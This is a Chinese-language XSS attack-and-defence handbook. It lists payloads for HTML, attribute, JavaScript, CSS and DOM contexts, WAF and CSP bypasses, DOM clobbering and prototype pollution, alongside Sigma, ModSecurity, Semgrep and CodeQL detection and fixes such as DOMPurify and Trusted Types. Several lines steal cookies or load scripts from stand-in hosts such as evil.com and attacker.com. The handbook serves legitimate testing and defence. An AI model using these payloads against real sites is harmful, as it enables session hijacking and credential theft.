---
name: web-injection-xss
description: >
  全面覆盖 XSS（跨站脚本）漏洞的识别、利用、检测和修复。涵盖所有 XSS 变体
  （反射型、存储型、DOM 型、突变型、UTF-7），覆盖所有注入上下文
  （HTML、属性、JavaScript、CSS、URL、SVG），包含 WAF 绕过、编码混淆、
  CSP 绕过技术，集成 Burp Suite / ZAP / 手工测试方法论，
  以及防御侧的输出编码、CSP 策略、HttpOnly/SameSite Cookie、DOMPurify。
domain: cybersecurity
subdomain: web-security
tags: [xss, cross-site-scripting, dom-xss, stored-xss, reflected-xss, mutation-xss, csp-bypass, waf-bypass, burpsuite, dompurify, owasp-a3]
version: 2.0.0
---

# XSS 跨站脚本 — 完整攻防手册

## 适用场景

- Web 应用中发现用户输入被直接渲染到页面
- 需要评估输入过滤/输出编码是否充分
- 已确认 XSS 注入点，需要提升至 Cookie 窃取/钓鱼/蠕虫
- 前端代码审计中发现 `innerHTML`、`v-html`、`dangerouslySetInnerHTML`
- 需要设计或验证 XSS 防护措施（CSP、编码、DOMPurify）

---

## Part A：攻击方法论

### 1. XSS 分类与识别

| 类型 | 特征 | 持久性 | 检测难度 |
|------|------|--------|---------|
| 反射型 (Reflected) | 输入在 URL 参数中，立即响应返回 | 非持久 | 低 |
| 存储型 (Stored) | 输入存入数据库，其他用户浏览时触发 | 持久 | 低（但影响大） |
| DOM 型 | 纯前端 JS 处理，不经过服务器 | 非持久 | 高 |
| 突变型 (Mutation) | 浏览器解析引擎"修复"HTML 后产生新向量 | 取决于上下文 | 极高 |

### 2. 按注入上下文的载荷

#### 2.1 HTML 标签上下文

```html
<!-- 基础探测 -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- 绕过标签过滤 -->
<ScRiPt>alert(1)</ScRiPt>              <!-- 大小写混淆 -->
<scr<script>ipt>alert(1)</scr</script>ipt>  <!-- 嵌套删除 -->
<scri\x00pt>alert(1)</script>           <!-- 空字节 (旧浏览器) -->
<scri\tpt>alert(1)</script>             <!-- 制表符 -->
<scr%00ipt>alert(1)</script>            <!-- URL 编码空字节 -->
<<script>script>alert(1)<</script>/script>  <!-- 双标签 -->

<!-- 事件处理器枚举 -->
<img src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<meter onmouseover=alert(1)>1</meter>
<marquee onstart=alert(1)>
<isindex type=image src=1 onerror=alert(1)>  <!-- HTML5 废弃但仍有效 -->
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<form><button formaction="javascript:alert(1)">click</button></form>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>  <!-- MathML 绕过 -->
```

#### 2.2 HTML 属性上下文

```html
<!-- 突破属性引号 -->
<input value="XSS"><script>alert(1)</script>">
<input value='XSS'><script>alert(1)</script>'>

<!-- 事件属性注入（引号被过滤时） -->
<input value="" onfocus=alert(1) autofocus="">
<input value="" onmouseover=alert(1) ">

<!-- href/src 属性（javascript: 协议） -->
<a href="javascript:alert(1)">click</a>
<a href="&#x6A;avascript:alert(1)">click</a>  <!-- 编码绕过 -->
<a href="jav&#x09;ascript:alert(1)">click</a> <!-- 制表符 -->
<a href="jav&#x0A;ascript:alert(1)">click</a> <!-- 换行 -->
<a href="jav&#x0D;ascript:alert(1)">click</a> <!-- 回车 -->
```

#### 2.3 JavaScript 上下文

```javascript
// 直接闭合 script 标签
<script>var data = 'XSS';</script><script>alert(1)</script><script>';</script>

// 闭合字符串
<script>var data = 'XSS';alert(1);//';</script>

// Unicode 转义
<script>var data = '<script>alert(1)</script>';</script>

// 模板字符串
<script>var data = `${alert(1)}`;</script>

// 构造函数
<script>var data = 'XSS';[1].find(alert);//';</script>
```

#### 2.4 CSS 上下文

```css
<style>
body { background: url('javascript:alert(1)'); }  /* 仅旧浏览器 */
body { background: url('xss'); }  /* 触发网络请求 */
@import 'javascript:alert(1)';     /* 仅旧 IE */
</style>

<div style="background:url('javascript:alert(1)')">  /* 内联样式 */
<div style="width:expression(alert(1))">  /* IE CSS 表达式 */
```

### 3. DOM 型 XSS

```javascript
// 危险 Sink 清单
document.write(userInput)
element.innerHTML = userInput
element.outerHTML = userInput
eval(userInput)
setTimeout(userInput, 100)
setInterval(userInput, 100)
Function(userInput)()
location.href = userInput          // JS 钓鱼/重定向
location.replace(userInput)
jQuery.append(userInput)           // jQuery < 3.0
jQuery.html(userInput)
jQuery.parseHTML(userInput)

// Source → Sink 常见路径
// URL 参数 → innerHTML
document.getElementById('output').innerHTML = new URLSearchParams(location.search).get('name');

// location.hash → eval
eval(location.hash.slice(1));  // page.html#alert(1)

// postMessage → innerHTML
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;
});

// document.referrer → document.write
document.write('Welcome from ' + document.referrer);

// 框架特定危险模式
// React
<div dangerouslySetInnerHTML={{__html: userInput}} />

// Vue
<div v-html="userInput"></div>

// Angular
<div [innerHTML]="userInput"></div>  // Angular 默认 sanitizes
<div bypassSecurityTrustHtml="userInput"></div>  // 不安全绕过

// Svelte
{@html userInput}
```

### 4. 突变型 XSS (mXSS)

```html
<!-- 浏览器"修复"HTML 后产生可执行代码 -->
<svg><![CDATA[><img src=x onerror=alert(1)>]]>   <!-- SVG CDATA 突变 -->
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>  <!-- MathML 反引号突变 -->
<listing>&lt;img src=x onerror=alert(1)&gt;</listing>  <!-- 某些浏览器会反转义 -->
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">  <!-- SVG+Style 突变 -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">  <!-- noscript 上下文切换 -->
```

### 5. CSP 绕过

```
# 常见 CSP 策略与绕过方法

## script-src 'unsafe-inline' → 直接注入（已允许内联）
<script>alert(1)</script>

## script-src 'nonce-xxx' → 需要获取 nonce（通常不可行，除非有其他漏洞）
<script nonce="leaked-nonce">alert(1)</script>

## script-src 'self' → JSONP 端点绕过
<script src="/api/callback?callback=alert(1)//"></script>
<script src="/js/jquery.js?callback=alert(1)"></script>

## script-src 'self' + 文件上传 → 上传含 JS 的文件
上传 test.js 内容为 alert(1)，然后 <script src="/uploads/test.js">

## default-src 'none'; script-src 'unsafe-eval' → eval 绕过
<script>eval(atob('YWxlcnQoMSk='))</script>  // base64("alert(1)")

## script-src 'strict-dynamic' → 利用已信任的脚本加载
<script src="trusted.js"></script>  // 如果 trusted.js 动态创建 script 标签

## base-uri 未限制 → 劫持相对路径
<base href="https://attacker.com/">
<script src="/js/app.js"></script>  <!-- 加载 attacker.com/js/app.js -->

## object-src 未限制或 'self'
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">

## 利用 Google Analytics / CDN 白名单
<script src="https://www.google-analytics.com/gtm/js?id=GTM-XXXX&callback=alert(1)"></script>
<script src="https://cdn.jsdelivr.net/npm/angular@1.8.2/angular.min.js"></script>
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>  <!-- Angular CSP 绕过 -->
```

### 6. WAF 绕过

```html
<!-- 编码绕过 -->
<img src=x onerror="&#97;lert(1)">          <!-- HTML 实体 -->
<img src=x onerror="&#x61;lert(1)">         <!-- 十六进制实体 -->
<img src=x onerror="alert&#40;1&#41;">      <!-- 括号编码 -->
<script>alert(1)</script>                <!-- Unicode 转义 -->
<script>eval(atob('YWxlcnQoMSk='))</script> <!-- Base64 -->

<!-- 字符串构造 -->
<script>window['al'+'ert'](1)</script>
<script>window['\x61\x6c\x65\x72\x74'](1)</script>
<script>top['al'+'ert'](1)</script>
<script>self['al'+'ert'](1)</script>

<!-- 替代函数 -->
<script>throw/onerror=alert/1</script>       <!-- 异常处理 -->
<script>{onerror=alert}throw 1</script>      <!-- 异常处理简写 -->
<script>[].constructor.constructor('alert(1)')()</script>  <!-- Function 构造 -->
<script>Reflect.construct(Function,['alert(1)'])()</script>
<script>import('data:text/javascript,alert(1)')</script>  <!-- ES Module -->

<!-- HTML 实体 + 事件 -->
<img src=x onerror="a&#x6c;ert(1)">
<svg/onload="a&#108;ert(1)">
<details open ontoggle="a&#x6c;ert(1)">

<!-- 换行/制表符分隔 -->
<img src=x one
rror=alert(1)>
<img src=x onerror
=alert(1)>

<!-- 双重 URL 编码 -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Unicode 标签替代 -->
＜script＞alert(1)＜/script＞  <!-- 全角字符（某些 WAF 不识别） -->
```

### 7. Burp Suite 自动化测试

```
# 1. 被动扫描 — 自动检测反射参数
# Proxy → HTTP History → 右键 → Send to Scanner

# 2. 主动扫描配置
# Scanner → Scan configuration → Crawl and Audit
# 启用 "XSS" 扫描模块

# 3. Intruder 暴力测试 XSS 载荷
# 将参数标记为 §payload§
# Payloads → 加载 XSS 载荷列表
# Grep-Match → 添加 "alert(" "prompt(" "confirm(" 检测回显

# 4. 常用 Burp 扩展
# - Reflected Parameters: 高亮反射的参数
# - XSS Validator: 结合 xss.js 验证
# - Turbo Intruder: 大量载荷高速测试
```

---

## Part B：检测与防御

### 8. 检测规则

#### 8.1 Sigma 规则

```yaml
title: XSS Pattern in Web Request
status: experimental
logsource:
  category: webserver
detection:
  selection:
    cs-uri-query|contains:
      - "<script"
      - "onerror="
      - "onload="
      - "javascript:"
      - "onmouseover="
      - "onfocus="
      - "onmouseout="
      - "onsubmit="
      - "alert("
      - "prompt("
      - "confirm("
      - "document.cookie"
      - "document.write"
      - ".innerHTML"
  condition: selection
level: medium
tags:
  - attack.t1059.007
  - attack.initial_access
```

#### 8.2 ModSecurity CRS

```
SecRule ARGS "(?i:<script[\s/]|on\w+\s*=|javascript\s*:|eval\s*\(|expression\s*\()" \
  "id:9501,phase:2,deny,status:403,msg:'XSS Attack Detected'"
```

### 9. 修复方案

#### 9.1 输出编码（按上下文）

```javascript
// HTML 上下文
function escapeHtml(str) {
    return str.replace(/[&<>"']/g, c => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;'
    })[c]);
}

// 属性上下文 — 同 escapeHtml，但确保引号包裹
element.setAttribute('value', escapeHtml(input));

// JavaScript 上下文 — 使用 JSON 编码
const data = JSON.parse('<?php echo json_encode($user_input, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_AMP); ?>');

// URL 上下文 — 验证协议
function safeUrl(url) {
    if (/^https?:\/\//i.test(url)) return url;
    return '#';
}
element.href = safeUrl(input);
```

#### 9.2 DOMPurify（HTML 富文本场景）

```javascript
// 安装: npm install dompurify
import DOMPurify from 'dompurify';

// 基础使用
element.innerHTML = DOMPurify.sanitize(userInput);

// 限制允许的标签和属性
element.innerHTML = DOMPurify.sanitize(userInput, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOW_DATA_ATTR: false
});

// 强制所有链接新窗口打开
DOMPurify.addHook('afterSanitizeAttributes', function(node) {
    if (node.tagName === 'A') {
        node.setAttribute('target', '_blank');
        node.setAttribute('rel', 'noopener noreferrer');
    }
});
```

#### 9.3 CSP 策略

```
# 推荐的严格 CSP（nonce-based）
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-{random}' 'strict-dynamic';
  style-src 'self' 'nonce-{random}';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  require-trusted-types-for 'script';

# Laravel Blade 中使用 @nonce
<script nonce="{{ csp_nonce() }}">...</script>

# Django 中间件
# django-csp 包: MIDDLEWARE += ['csp.middleware.CSPMiddleware']
```

#### 9.4 Cookie 保护

```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
#             ↑ JS 不可读    ↑ 仅 HTTPS   ↑ 防 CSRF       ↑ 限制路径   ↑ 过期时间
```

#### 9.5 框架特定安全配置

```javascript
// React — 避免 dangerouslySetInnerHTML
// 默认 JSX 表达式会自动转义
<div>{userInput}</div>  // ✅ 自动转义
<div dangerouslySetInnerHTML={{__html: userInput}} />  // ❌ 避免

// Vue — 避免 v-html
<div>{{ userInput }}</div>  // ✅ 自动转义
<div v-html="userInput"></div>  // ❌ 避免

// Angular — 默认 sanitizes
<div>{{ userInput }}</div>  // ✅ 自动转义
<div [innerHTML]="userInput"></div>  // ✅ Angular 会 sanitizes
<div [innerHTML]="bypassSecurityTrustHtml(userInput)"></div>  // ❌ 跳过安全

// Svelte — 避免 {@html}
<div>{userInput}</div>  // ✅ 自动转义
<div>{@html userInput}</div>  // ❌ 避免
```

---

## 速查表

### 事件处理器完整列表

| 类别 | 事件 |
|------|------|
| 鼠标 | onclick, ondblclick, onmousedown, onmouseup, onmouseover, onmouseout, onmousemove |
| 键盘 | onkeydown, onkeyup, onkeypress |
| 加载 | onload, onerror, onabort, onresize, onscroll, onunload |
| 表单 | onfocus, onblur, onsubmit, onreset, onchange, onselect, oninput |
| 媒体 | onplay, onpause, onended, onvolumechange |
| 拖拽 | ondrag, ondragstart, ondragend, ondragover, ondragenter, ondragleave, ondrop |
| 剪贴板 | oncopy, oncut, onpaste |
| 触摸 | ontouchstart, ontouchmove, ontouchend |
| 其他 | ontoggle, oncontextmenu, onwheel, onpointerdown, onanimationend |

### XSS 利用升级路径

| 级别 | 利用方式 | 影响 |
|------|---------|------|
| L1 | `alert(document.domain)` | 证明漏洞存在 |
| L2 | `document.location='https://evil.com/?c='+document.cookie` | Cookie 窃取 |
| L3 | 加载外部 JS `<script src="https://evil.com/xss.js">` | 完整会话劫持 |
| L4 | 读取页面内容 + 发送 | 数据泄露 |
| L5 | 构造钓鱼表单 | 凭据收集 |
| L6 | CSRF + XSS 组合 | 账户接管 |
| L7 | Self-XSS + CSRF → Stored XSS | 漏洞链升级 |

## MITRE ATT&CK 映射

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Drive-by Compromise | T1189 |
| Execution | Command and Scripting Interpreter: JavaScript | T1059.007 |
| Collection | Browser Session Hijacking | T1185 |
| Credential Access | Credentials from Web Browsers | T1555.003 |
| Exfiltration | Exfiltration Over Web Service | T1567 |

## 前置条件

- 目标 Web 应用可访问
- Burp Suite / ZAP 或浏览器 DevTools 可用
- 对于 DOM XSS：需要阅读和分析前端 JavaScript 源码
- CSP 报告端点已配置（用于测试 CSP 策略）

---

## Part C：2025-2026 更新

> 本部分补充近两年 XSS 攻防领域的重要演进，覆盖 DOM Clobbering、Prototype Pollution to XSS、
> 高级 CSP 绕过、自动化检测、Trusted Types 防御、现代框架绕过及盲 XSS 狩猎。

### C1. DOM Clobbering 攻击

DOM Clobbering 利用 HTML 元素对 JavaScript 全局变量的覆盖能力，通过注入非脚本 HTML 元素
来篡改后续 JS 逻辑中引用的变量或配置对象，从而间接实现 XSS。

```html
<!-- 覆盖全局变量 -->
<form id="config"></form>
<form id="config" name="apiEndpoint" action="https://evil.com/steal"></form>
<!-- 结果: window.config.apiEndpoint === "https://evil.com/steal" -->

<!-- 覆盖 document 属性 -->
<img name="cookie" src="stolen-value">
<!-- 结果: document.cookie 可能被覆盖（部分浏览器） -->

<!-- 覆盖安全检查函数 -->
<form id="sanitize"></form>
<input name="innerHTML" value="<img src=x onerror=alert(1)>">
<!-- 如果代码调用 window.sanitize.innerHTML，将得到攻击者控制的值 -->

<!-- 利用 HTML Collection 特性 -->
<a id="defaultView"></a>
<a id="defaultView" name="location" href="javascript:alert(1)"></a>
<!-- 某些浏览器中 document.defaultView.location 可被劫持 -->

<!-- 实战场景: 覆盖 CSP 报告端点 -->
<meta http-equiv="Content-Security-Policy" content="report-uri /csp-report">
<form id="cspReportUri"><input name="href" value="https://evil.com/log"></form>
<!-- 如果应用逻辑读取 window.cspReportUri.href 作为上报地址 -->

<!-- 组合利用: DOM Clobbering → bypass DOMPurify 检查 -->
<form id="ALLOWED_TAGS">
  <input name="push" value="img">
  <input name="push" value="svg">
</form>
<!-- 如果安全配置从 DOM 中读取 ALLOWED_TAGS -->
```

**检测要点**:
- 搜索前端代码中对 `window.*`、`document.*` 的动态属性访问
- 检查是否存在未声明的全局变量被 HTML `id`/`name` 覆盖
- 利用 DevTools Console: `Object.keys(window)` 查看被覆盖的全局变量

**防御**:
```javascript
// 使用严格相等和类型检查
const config = typeof window.config === 'object' ? window.config : getDefaultConfig();

// 从 DOM 获取值时验证来源
const el = document.getElementById('config');
if (el && el instanceof HTMLFormElement) {
    // 这是一个 DOM Clobbering 注入，不是真正的配置
}
```

---

### C2. Prototype Pollution to XSS

通过污染 JavaScript 原型链 (`Object.prototype`)，攻击者可以影响未正确初始化的对象属性，
从而绕过安全检查、注入 payload 或劫持控制流。

```javascript
// === 基本原型链污染 ===
Object.prototype.isAdmin = true;
Object.prototype.sanitize = function(x) { return x; };  // 覆盖安全函数

// === 通过 URL 参数污染 (常见于旧版 lodash / jQuery) ===
// 漏洞代码: lodash.set({}, location.hash.slice(1), 'polluted')
// 利用 URL: page.html#__proto__[injected]=<img src=x onerror=alert(1)>

// === 通过 JSON 深度合并 ===
// 如果应用接受 JSON 输入并递归合并:
fetch('/api/settings', {
    method: 'POST',
    body: JSON.stringify({
        "__proto__": { "isAdmin": true, "xssPayload": "<img src=x onerror=alert(1)>" },
        "constructor": { "prototype": { "dangerousKey": "javascript:alert(1)" } }
    })
});

// === Prototype Pollution → CSP 绕过 ===
// 如果 CSP 策略由前端 JS 动态生成:
Object.prototype['script-src'] = "'self' https://evil.com";
// 或者覆盖 nonce 生成逻辑:
Object.prototype['cspNonce'] = 'known-nonce-value';

// === Prototype Pollution → DOM XSS ===
// 污染 innerHTML 安全检查的配置
Object.prototype.sanitizeOptions = false;
Object.prototype.ALLOWED_TAGS = ['img', 'svg', 'script'];  // 添加 script
Object.prototype.ADD_TAGS = ['script'];
Object.prototype.ADD_ATTR = ['onerror', 'onload'];

// DOMPurify 被污染后的利用
// 如果 DOMPurify 读取了 Object.prototype.FORCE_BODY = false
// 则可以利用 <style> 标签中嵌套 HTML 进行 mXSS

// === 污染 fetch/XMLHttpRequest 默认行为 ===
Object.prototype.headers = { 'X-Custom-Header': '<script>alert(1)</script>' };
// 如果后端反射 header 值到 HTML 页面，则触发 Stored XSS
```

**常见污染入口**:
| 库/框架 | 污染方法 | CVE |
|---------|---------|-----|
| lodash < 4.17.12 | `_.set()`, `_.merge()`, `_.defaultsDeep()` | CVE-2020-8203 |
| jQuery < 3.4.1 | `$.extend(true, ...)` | CVE-2019-11358 |
| express-fileupload | `parse()` | CVE-2020-7699 |
| minimist | `parse()` | CVE-2020-7598 |
| deepmerge | `deepmerge()` | 多个版本 |

**检测 Payload**:
```javascript
// 在控制台执行，检测是否可被污染
Object.prototype.testPollution = 'pwned';
console.log({}.testPollution);  // 如果输出 'pwned' 则存在漏洞
delete Object.prototype.testPollution;

// 自动化扫描: 使用 npm audit / Snyk / Trivy 检测依赖中的 PP 漏洞
```

---

### C3. CSP 绕过技术进阶

#### C3.1 JSONP 端点利用

```html
<!-- 即使 CSP 限制 script-src 'self'，如果同域有 JSONP 端点 -->
<script src="/api/search?q=test&callback=alert(1)//"></script>
<!-- 返回: alert(1)//({"results":[]})  → 弹窗 -->

<!-- 利用第三方 JSONP（如果在白名单中） -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//"></script>
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)//"></script>
<script src="https://api.instagram.com/v1/tags/search?callback=alert(1)//"></script>
```

#### C3.2 Base 标签劫持

```html
<!-- 如果 CSP 未限制 base-uri -->
<base href="https://attacker.com/">
<!-- 后续所有相对路径资源加载指向攻击者服务器 -->
<script src="/js/app.js"></script>  <!-- 加载 attacker.com/js/app.js -->
<link rel="stylesheet" href="/css/style.css">  <!-- 加载攻击者 CSS -->
```

防御: CSP 中始终包含 `base-uri 'self';`

#### C3.3 Script Gadget（脚本小工具）

利用页面中已加载的可信 JavaScript 库中的"代码片段"(gadget) 执行任意代码:

```html
<!-- AngularJS CSP Bypass (ng-csp 模式) -->
<div ng-app ng-csp>
  {{constructor.constructor('alert(1)')()}}
</div>
<!-- 或利用 $event -->
<div ng-app ng-csp>
  <input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([alert(1)])'">
</div>

<!-- Bootstrap → XSS -->
<a data-toggle="tooltip" data-html="true" title="<img src=x onerror=alert(1)>">hover me</a>

<!-- jQuery Plugin Gadget -->
<!-- 如果页面加载了 jQuery UI 或含 $.fn.tooltip 的插件 -->
<div data-tooltip="<img src=x onerror=alert(1)>">text</div>

<!-- DOMPurify 绕过 via mXSS + Gadget -->
<math><mtext><table><mglyph><style><!--</style>
<img src=x onerror=alert(1)>
```

#### C3.4 Web Worker 绕过

```javascript
// Web Worker 不受 CSP script-src 限制（部分浏览器/配置）
// 如果 CSP 允许 connect-src 或 worker-src 宽松
var worker = new Worker('data:text/javascript,fetch("https://evil.com/steal?cookie="+document.cookie)');

// Blob URL Worker
var blob = new Blob(['importScripts("https://evil.com/evil.js")'], {type: 'text/javascript'});
var worker = new Worker(URL.createObjectURL(blob));

// 如果 CSP 包含 script-src 'self' 但允许 Blob URL (某些浏览器)
// 可利用 Worker 执行跨域请求窃取数据
```

#### C3.5 利用 `<meta>` 标签注入/修改 CSP

```html
<!-- 某些服务器解析多个 CSP header 时取并集 -->
<!-- 如果能注入第二个 CSP header（如通过 CRLF 注入） -->
Content-Security-Policy-Report-Only: default-src 'unsafe-inline'
<!-- Report-Only 不会阻止但可误导分析 -->

<!-- 利用 http-equiv 覆盖（部分浏览器支持） -->
<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline' 'self'">
```

#### C3.6 利用信任域名的重定向

```html
<!-- CSP: script-src 'self' https://trusted-cdn.com -->
<!-- 如果 trusted-cdn.com 有开放重定向 -->
<script src="https://trusted-cdn.com/redirect?url=https://evil.com/payload.js"></script>

<!-- 利用 CDN 的路径遍历 -->
<script src="https://cdn.jsdelivr.net/npm/evil-package@1.0.0/steal.js"></script>
<!-- 如果 CSP 白名单了整个 cdn.jsdelivr.net 域 -->
```

---

### C4. DOM XSS 自动化检测

#### C4.1 Semgrep 静态分析

```yaml
# semgrep-dom-xss.yaml
rules:
  - id: dom-xss-innerhtml
    patterns:
      - pattern: |
          $EL.innerHTML = $INPUT
      - pattern-not: |
          $EL.innerHTML = DOMPurify.sanitize(...)
    message: "DOM XSS: innerHTML 赋值使用未净化的输入"
    severity: ERROR
    languages: [javascript, typescript]

  - id: dom-xss-eval
    patterns:
      - pattern: |
          eval($INPUT)
      - pattern-not: |
          eval("...")
    message: "DOM XSS: eval() 使用动态输入"
    severity: ERROR
    languages: [javascript, typescript]

  - id: dom-xss-document-write
    patterns:
      - pattern: |
          document.write($INPUT)
    message: "DOM XSS: document.write() 使用动态输入"
    severity: WARNING
    languages: [javascript, typescript]

  - id: dom-xss-jquery-html
    patterns:
      - pattern: |
          $JQ.html($INPUT)
      - pattern-not: |
          $JQ.html(DOMPurify.sanitize(...))
    message: "DOM XSS: jQuery .html() 使用未净化的输入"
    severity: ERROR
    languages: [javascript, typescript]

  - id: dom-xss-postmessage
    patterns:
      - pattern: |
          window.addEventListener('message', function($E) {
            ..., $SINK = $E.data, ...
          })
    message: "postMessage handler 未验证 origin 且使用 data 作为 sink"
    severity: WARNING
    languages: [javascript, typescript]
```

```bash
# 执行扫描
semgrep --config semgrep-dom-xss.yaml --include="*.js" --include="*.jsx" --include="*.ts" --include="*.tsx" ./src/
```

#### C4.2 CodeQL 查询

```ql
/**
 * @name DOM XSS via innerHTML assignment
 * @kind path-problem
 * @problem.severity error
 * @security-severity 9.6
 * @id js/xss-innerhtml
 */

import javascript
import semmle.code.java.security.XssQuery

from DataFlow::PathNode source, DataFlow::PathNode sink
where
  source instanceof RemoteFlowSource and
  sink instanceof InnerHtmlSink and
  DataFlow::localFlow(source, sink)
select sink, source, sink, "DOM XSS: user-controlled input flows to innerHTML"
```

```bash
# CodeQL 数据库创建与查询
codeql database create --language=javascript --source-root=./ js-db
codeql query run --database=js-db dom-xss.ql --output=results.csv
```

#### C4.3 HUNT (Burp Suite 扩展)

```
# HUNT by Bugcrowd — 自动标记可能存在 DOM XSS 的参数
# 安装: BApp Store → HUNT
#
# 自动检测的参数名:
#   - redirect, url, link, next, return, redir, target
#   - callback, cb, jsonp, reply
#   - data, input, content, value, query
#   - file, document, folder, root, pg, style, pdf, template
#
# HUNT 会在 Burp 的 Scanner 结果中高亮这些参数
# 配合 Active Scan 使用效果最佳
```

#### C4.4 动态检测工具

| 工具 | 方法 | 适用场景 |
|------|------|---------|
| **DOM Invader** (Burp) | 浏览器扩展，自动追踪 DOM 数据流 | DOM XSS 黑盒测试 |
| **FuzzFaster** | 参数 Fuzzing + XSS 载荷 | 批量测试 |
| **dalfox** | 命令行 XSS 扫描器 | 快速验证反射型/DOM XSS |
| **xsstrike** | 智能载荷生成 + DOM 分析 | 高级 XSS 检测 |
| **ZAP Ajax Spider** | 基于 Selenium 的爬取 | SPA 应用扫描 |

```bash
# dalfox 使用示例
dalfox url "https://target.com/search?q=test" --blind https://your-callback.xss.ht

# xsstrike 使用示例
xsstrike -u "https://target.com/page" --crawl

# 结合 nuclei 模板批量检测
nuclei -t cves/ -t XSS/ -u https://target.com
```

---

### C5. Trusted Types 防御

Trusted Types 是浏览器原生的 XSS 防御机制，要求所有 DOM sink 只接受"受信任的类型"
而非任意字符串，从根源上阻止 DOM XSS。

```http
// HTTP Header 启用
Content-Security-Policy: require-trusted-types-for 'script';

// Report-Only 模式（推荐先用此模式收集报告）
Content-Security-Policy-Report-Only: require-trusted-types-for 'script'; report-uri /csp-report;

// 配合 Trusted Types 策略
Content-Security-Policy:
  require-trusted-types-for 'script';
  trusted-types dompurify default;
```

```javascript
// === 应用代码: 创建受信任的策略 ===

// 策略 1: DOMPurify 策略（推荐）
if (window.trustedTypes) {
    const sanitizerPolicy = trustedTypes.createPolicy('dompurify', {
        createHTML: (input) => DOMPurify.sanitize(input, {
            RETURN_TRUSTED_TYPE: true
        })
    });

    // 使用: 只能通过策略创建 TrustedHTML
    element.innerHTML = sanitizerPolicy.createHTML(userInput);
}

// 策略 2: 简单转义策略
if (window.trustedTypes) {
    const escapePolicy = trustedTypes.createPolicy('escape', {
        createHTML: (input) => input
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;')
    });

    element.innerHTML = escapePolicy.createHTML(userInput);
}

// 策略 3: 严格白名单策略
if (window.trustedTypes) {
    const strictPolicy = trustedTypes.createPolicy('strict', {
        createHTML: (input) => {
            // 只允许纯文本
            if (/<[a-zA-Z]/.test(input)) {
                throw new Error('HTML tags not allowed');
            }
            return input;
        },
        createScript: (input) => {
            // 禁止动态脚本
            throw new Error('Dynamic scripts not allowed');
        },
        createScriptURL: (input) => {
            // 只允许白名单域名的脚本
            const allowed = ['https://cdn.example.com/', 'https://trusted.com/'];
            if (allowed.some(d => input.startsWith(d))) return input;
            throw new Error('Script URL not in whitelist: ' + input);
        }
    });
}

// === 不使用 Trusted Types 的 fallback ===
// 没有 TT 的浏览器中回退到 DOMPurify
function setHTML(element, input) {
    const html = (window.trustedTypes && trustedTypes.createPolicy)
        ? trustedTypes.createPolicy('default', { createHTML: (s) => DOMPurify.sanitize(s) }).createHTML(input)
        : DOMPurify.sanitize(input);
    element.innerHTML = html;
}
```

**浏览器支持**: Chrome 83+, Edge 83+, Opera 69+。Firefox 和 Safari 正在实现中。

**迁移步骤**:
1. 先部署 `Content-Security-Policy-Report-Only` 收集违规报告
2. 分析报告中哪些代码路径需要创建 Trusted Types 策略
3. 为每个 DOM sink 创建对应的策略
4. 正式部署 `require-trusted-types-for 'script'`

---

### C6. XSS in Modern Framework（框架转义绕过）

#### C6.1 React

```jsx
// === React 默认转义机制 ===
// JSX 表达式自动转义 HTML
<div>{userInput}</div>  // ✅ 安全，<script> 会被转义为 &lt;script&gt;

// === 绕过场景 1: dangerouslySetInnerHTML ===
<div dangerouslySetInnerHTML={{__html: userInput}} />  // ❌ 直接渲染 HTML

// === 绕过场景 2: href 属性注入 ===
// React 会阻止 javascript: 协议，但存在绕过
<a href={userInput}>click</a>
// 绕过: userInput = "javascript:alert(1)"  (React 16+ 已修复为小写检查)
// 但以下可能绕过: "\x01javascript:alert(1)" (某些旧版本)
// 推荐: 使用自定义 URL 验证
<a href={sanitizeUrl(userInput)}>click</a>

// === 绕过场景 3: SSR 注入 ===
// 服务端渲染时，如果模板字符串拼接了用户输入
// ReactDOMServer.renderToString() 是安全的
// 但 next.js getServerSideProps 中的 JSON.stringify 可能有问题:
<script id="__NEXT_DATA__" type="application/json">
  {JSON.stringify({props: {userInput}})}  // 如果 userInput 含 </script><script>
</script>
// 修复: 使用 JSON 序列化时替换 </script>
function safeJSON(obj) {
    return JSON.stringify(obj).replace(/<\/script/gi, '<\\/script');
}

// === 绕过场景 4: useRef + innerHTML ===
const ref = useRef();
useEffect(() => {
    ref.current.innerHTML = userInput;  // ❌ 直接赋值，绕过 React 转义
}, [userInput]);
```

#### C6.2 Vue

```vue
<!-- === Vue 默认转义 === -->
<div>{{ userInput }}</div>  <!-- ✅ 安全，自动 HTML 转义 -->

<!-- === 绕过场景 1: v-html === -->
<div v-html="userInput"></div>  <!-- ❌ 直接渲染 HTML -->

<!-- === 绕过场景 2: 模板编译注入 === -->
<!-- 如果应用使用动态组件或模板编译 -->
<component :is="dynamicComponent" />
<!-- 如果 dynamicComponent 来自用户输入且包含恶意模板 -->
<!-- Vue 3: {{ constructor.constructor('alert(1)')() }} -->
